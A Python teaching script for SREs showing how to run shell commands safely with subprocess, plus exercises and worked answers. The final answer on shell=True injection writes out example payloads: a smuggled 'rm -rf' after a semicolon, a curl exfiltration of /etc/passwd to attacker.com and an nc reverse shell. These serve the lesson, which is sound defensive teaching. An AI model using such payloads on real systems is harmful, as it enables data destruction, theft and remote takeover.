#!/usr/bin/env python3
"""
04_subprocess_runner.py - Safe Subprocess / Shell Command Runner
SRE use-case: wrapping CLI tools (kubectl, terraform, docker, git) in Python
scripts for automation, with proper error handling and output capture.

Concepts: subprocess, shlex, logging, Popen vs run, timeouts, pipes
Run: python 04_subprocess_runner.py
"""

import json
import logging
import os
import shlex
import subprocess
import sys
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import List, Optional

# Configure structured logging - in prod you'd output JSON for log aggregators
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)-8s %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)


@dataclass
class CommandResult:
    cmd: str
    returncode: int
    stdout: str
    stderr: str
    elapsed_s: float

    @property
    def ok(self) -> bool:
        return self.returncode == 0

    def __str__(self) -> str:
        status = "OK" if self.ok else f"FAILED(rc={self.returncode})"
        return f"[{status}] `{self.cmd}` ({self.elapsed_s:.2f}s)"


# ---------------------------------------------------------------------------
# Exercise 4: Structured JSON logging helper
# Emits a machine-parseable JSON line so log aggregators (Datadog, ELK, Loki)
# can ingest commands without regex parsing.
# ---------------------------------------------------------------------------
def _log_json(cmd: str, rc: int, elapsed: float) -> None:
    """Emit a structured JSON log line for every command that completes."""
    record = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "cmd": cmd,
        "rc": rc,
        "elapsed": round(elapsed, 4),
    }
    log.info("CMD_JSON %s", json.dumps(record))


def run_cmd(
    cmd: str,
    timeout: float = 30.0,
    env: Optional[dict] = None,
    cwd: Optional[str] = None,
    check: bool = False,
) -> CommandResult:
    """
    Run a shell command safely.
    - Uses shlex.split so you pass a plain string, not shell=True (avoids injection).
    - Captures stdout and stderr separately.
    - Enforces a timeout to prevent hangs in automation.
    """
    args: List[str] = shlex.split(cmd)
    log.info("Running: %s", cmd)
    start = time.monotonic()
    try:
        proc = subprocess.run(
            args,
            capture_output=True,  # capture_output=True requires Python 3.7+
            text=True,            # decode stdout/stderr as str (not bytes)
            timeout=timeout,
            env={**os.environ, **(env or {})},  # merge caller env with process env
            cwd=cwd,
        )
    except subprocess.TimeoutExpired:
        log.error("Command timed out after %ss: %s", timeout, cmd)
        _log_json(cmd, -1, timeout)
        return CommandResult(cmd=cmd, returncode=-1, stdout="", stderr="TIMEOUT", elapsed_s=timeout)
    except FileNotFoundError:
        log.error("Command not found: %s", args[0])
        _log_json(cmd, 127, 0.0)
        return CommandResult(cmd=cmd, returncode=127, stdout="", stderr=f"not found: {args[0]}", elapsed_s=0)

    elapsed = time.monotonic() - start
    result = CommandResult(
        cmd=cmd,
        returncode=proc.returncode,
        stdout=proc.stdout.strip(),
        stderr=proc.stderr.strip(),
        elapsed_s=elapsed,
    )

    if result.ok:
        log.info("  %s", result)
    else:
        log.warning("  %s", result)
        if proc.stderr:
            log.warning("  stderr: %s", proc.stderr.strip()[:300])

    # Exercise 4: emit structured JSON log after every command
    _log_json(cmd, result.returncode, elapsed)

    if check and not result.ok:
        raise subprocess.CalledProcessError(proc.returncode, cmd)

    return result


# ---------------------------------------------------------------------------
# Exercise 1 (BUG FIX): run_streaming previously used stderr=subprocess.STDOUT
# which merged stderr silently into stdout.  Refactored to read stderr on a
# separate thread so error lines can be prefixed with "ERR | " while stdout
# lines keep their "  | " prefix, making failures immediately visible.
# ---------------------------------------------------------------------------
def run_streaming(cmd: str, timeout: float = 60.0) -> int:
    """
    Run a long-running command and stream its stdout line-by-line in real time.
    Stderr is captured separately and printed with the "ERR | " prefix so it is
    visually distinct from normal output.
    Useful for: terraform apply, docker build, test runners.
    Returns the exit code.
    """
    import threading

    args = shlex.split(cmd)
    log.info("Streaming: %s", cmd)
    try:
        with subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,   # FIXED: separate pipe instead of STDOUT merge
            text=True,
            bufsize=1,                # line-buffered
        ) as proc:
            deadline = time.monotonic() + timeout

            # Drain stderr on a background thread so it never blocks stdout
            def _drain_stderr() -> None:
                for line in proc.stderr:  # type: ignore[union-attr]
                    print(f"ERR | {line}", end="")

            stderr_thread = threading.Thread(target=_drain_stderr, daemon=True)
            stderr_thread.start()

            for line in proc.stdout:  # type: ignore[union-attr]
                print(f"  | {line}", end="")
                if time.monotonic() > deadline:
                    proc.kill()
                    log.error("Streaming command timed out: %s", cmd)
                    stderr_thread.join(timeout=2)
                    return -1

            stderr_thread.join(timeout=5)
            proc.wait()
            return proc.returncode
    except FileNotFoundError:
        log.error("Command not found: %s", args[0])
        return 127


# ---------------------------------------------------------------------------
# Exercise 2 (EXPAND): retry wrapper with exponential back-off
# Retries run_cmd up to `n` times when the command fails (non-zero exit).
# Delay doubles after each attempt: delay, delay*2, delay*4, ...
# Useful for transient network failures (aws s3 cp, curl, kubectl apply).
# ---------------------------------------------------------------------------
def retry(
    cmd: str,
    n: int = 3,
    delay: float = 1.0,
    timeout: float = 30.0,
    env: Optional[dict] = None,
    cwd: Optional[str] = None,
) -> CommandResult:
    """
    Retry run_cmd up to `n` times on failure using exponential back-off.

    Args:
        cmd:     The shell command to run.
        n:       Maximum number of attempts (including the first try).
        delay:   Initial wait in seconds between retries; doubles each round.
        timeout: Per-attempt timeout forwarded to run_cmd.
        env:     Extra environment variables forwarded to run_cmd.
        cwd:     Working directory forwarded to run_cmd.

    Returns the last CommandResult, whether it succeeded or not.
    """
    result: Optional[CommandResult] = None
    wait = delay
    for attempt in range(1, n + 1):
        result = run_cmd(cmd, timeout=timeout, env=env, cwd=cwd)
        if result.ok:
            return result
        if attempt < n:
            log.warning(
                "Attempt %d/%d failed (rc=%d) — retrying in %.1fs: %s",
                attempt, n, result.returncode, wait, cmd,
            )
            time.sleep(wait)
            wait *= 2  # exponential back-off
        else:
            log.error("All %d attempts failed for: %s", n, cmd)
    return result  # type: ignore[return-value]  # n >= 1, so always set


# ---------------------------------------------------------------------------
# Exercise 3 (EXPAND): kubectl rollout status helper
# Wraps `kubectl rollout status deployment/<name> -n <namespace>` and converts
# the textual result to a boolean.  Gracefully handles kubectl not being present
# on the PATH (returns False rather than crashing).
# ---------------------------------------------------------------------------
def kubectl_rollout_status(deployment: str, namespace: str = "default") -> bool:
    """
    Check whether a Kubernetes deployment has finished rolling out.

    Runs:
        kubectl rollout status deployment/<deployment> -n <namespace>

    Returns:
        True  — kubectl exited 0 AND stdout contains "successfully rolled out"
        False — non-zero exit, kubectl not installed, or output indicates failure

    The function never raises; all errors are logged and mapped to False so
    callers can use it safely in boolean checks without try/except.
    """
    cmd = f"kubectl rollout status deployment/{deployment} -n {namespace}"
    result = run_cmd(cmd, timeout=120.0)

    if result.returncode == 127:
        # run_cmd already logged "Command not found"; surface a clear message
        log.error(
            "kubectl is not installed or not on PATH — cannot check rollout status "
            "for deployment '%s' in namespace '%s'",
            deployment, namespace,
        )
        return False

    if not result.ok:
        log.warning(
            "kubectl rollout status returned rc=%d for %s/%s",
            result.returncode, namespace, deployment,
        )
        return False

    # kubectl prints "deployment.apps/<name> successfully rolled out" on success
    success = "successfully rolled out" in result.stdout.lower()
    if not success:
        log.warning(
            "Rollout may still be in progress for %s/%s: %s",
            namespace, deployment, result.stdout[:200],
        )
    return success


# ---------------------------------------------------------------------------
# Practical SRE scenarios
# ---------------------------------------------------------------------------

def demo_basic_commands() -> None:
    print("\n--- Basic command capture ---")
    # These work on Linux; on Windows they'll fail gracefully (FileNotFoundError)
    for cmd in [
        "uname -a",
        "df -h /",
        "free -m",
        "uptime",
        "hostname",
        "ls -la /tmp",
    ]:
        r = run_cmd(cmd)
        if r.ok and r.stdout:
            # Only show first line to keep output tidy
            print(f"  {r.stdout.splitlines()[0]}")


def demo_error_handling() -> None:
    print("\n--- Error / failure handling ---")

    # Command that will fail with non-zero exit
    r = run_cmd("ls /path/that/does/not/exist")
    print(f"  returncode={r.returncode}, stderr='{r.stderr[:60]}'")

    # Command not found
    r = run_cmd("notarealcommand --help")
    print(f"  returncode={r.returncode}, stderr='{r.stderr}'")

    # Timeout (sleep longer than our limit)
    r = run_cmd("sleep 5", timeout=1.0)
    print(f"  returncode={r.returncode}, stderr='{r.stderr}'")


def demo_env_injection() -> None:
    print("\n--- Custom environment variables ---")
    # SRE use: pass credentials or config as env vars, never as CLI args
    r = run_cmd("env", env={"MY_SECRET": "hunter2", "APP_ENV": "staging"})
    if r.ok:
        # Filter to just our custom vars
        relevant = [l for l in r.stdout.splitlines() if l.startswith("MY_") or l.startswith("APP_")]
        for line in relevant:
            print(f"  {line}")


def demo_pipeline() -> None:
    """
    Chaining commands safely - avoid shell=True pipelines.
    Instead, run each stage separately and connect via Python strings.
    """
    print("\n--- Safe pipeline (no shell=True) ---")
    r1 = run_cmd("ps aux")
    if r1.ok:
        # Filter in Python rather than piping to grep
        python_procs = [l for l in r1.stdout.splitlines() if "python" in l.lower()]
        print(f"  Found {len(python_procs)} python process(es)")


def main() -> None:
    demo_basic_commands()
    demo_error_handling()
    demo_env_injection()
    demo_pipeline()

    print("\n--- Streaming example (echo loop) ---")
    rc = run_streaming("bash -c 'for i in 1 2 3; do echo step $i; sleep 0.3; done'")
    print(f"  exit code: {rc}")


if __name__ == "__main__":
    main()


# =============================================================================
# EXERCISES
# =============================================================================
# 1. BUG: run_streaming merges stderr into stdout with STDOUT.  This means
#    error messages look identical to normal output.  Refactor it to capture
#    stderr separately and prefix those lines with "ERR | ".
#
#    ANSWER (see run_streaming above):
#    Changed stderr=subprocess.STDOUT to stderr=subprocess.PIPE.  A background
#    daemon thread drains proc.stderr and prints each line with "ERR | " prefix.
#    The main loop continues reading proc.stdout with the existing "  | " prefix.
#    Threading is necessary because reading two pipes sequentially risks deadlock
#    when the OS pipe buffer fills up.
#
# 2. EXPAND: Add a retry(n, delay) wrapper around run_cmd so transient
#    failures (e.g., network blips during `aws s3 cp`) are retried automatically.
#
#    ANSWER (see retry() above):
#    retry(cmd, n=3, delay=1.0) calls run_cmd in a loop up to n times.
#    On each failure it sleeps `wait` seconds then doubles `wait` (exponential
#    back-off: 1s, 2s, 4s, ...).  Returns the last CommandResult regardless of
#    success, so callers can still inspect returncode / stderr.
#
# 3. EXPAND: Write a function `kubectl_rollout_status(deployment, namespace)`
#    that runs `kubectl rollout status deployment/<name> -n <ns>` and returns
#    True/False based on the output.  Handle the case where kubectl is not installed.
#
#    ANSWER (see kubectl_rollout_status() above):
#    Uses run_cmd (shlex-safe, no shell=True) and maps the result to bool.
#    rc=127 means FileNotFoundError → kubectl missing → logs a clear message
#    and returns False.  Any other non-zero exit or missing success phrase also
#    returns False.  Never raises, safe to use in boolean conditionals.
#
# 4. EXPAND: Add structured logging that emits JSON:
#    {"ts": "...", "cmd": "...", "rc": 0, "elapsed": 0.12}
#    so log lines can be ingested by Datadog/ELK without parsing.
#
#    ANSWER (see _log_json() + calls in run_cmd above):
#    _log_json() builds the dict, serialises it with json.dumps, and emits it
#    via log.info so it flows through the standard logging stack (handlers,
#    formatters, log levels).  run_cmd calls it after every command including
#    timeout and FileNotFoundError paths.  In production you'd add a
#    JSONFormatter handler so the outer wrapper is also JSON (no text prefix).
#
# 5. THINK: Why is shell=True dangerous in an SRE script that accepts user
#    input?  Give a concrete example of a command injection attack it enables.
#
#    ANSWER:
#    When shell=True the string is passed verbatim to /bin/sh -c (or cmd.exe).
#    The shell interprets metacharacters (;, &&, |, $(), backticks, etc.) before
#    running the command, so an attacker can escape the intended command and run
#    arbitrary code.
#
#    Example: suppose an SRE script pings a host supplied by the user:
#
#        host = input("Enter hostname: ")          # attacker types:
#        # host = "8.8.8.8; rm -rf /important_dir"
#        subprocess.run(f"ping -c 1 {host}", shell=True)
#
#    The shell sees:  ping -c 1 8.8.8.8; rm -rf /important_dir
#    and executes BOTH commands.  With shell=False + shlex.split the semicolon
#    is passed as a literal argument to ping, which rejects it harmlessly.
#
#    Other dangerous payloads: "$(curl attacker.com/exfil?data=$(cat /etc/passwd))"
#    or "| nc attacker.com 4444 -e /bin/sh" for a reverse shell.
#
#    Rule of thumb: never use shell=True with any string that contains external
#    (user-controlled) data.  Use shlex.split + a list of args instead.
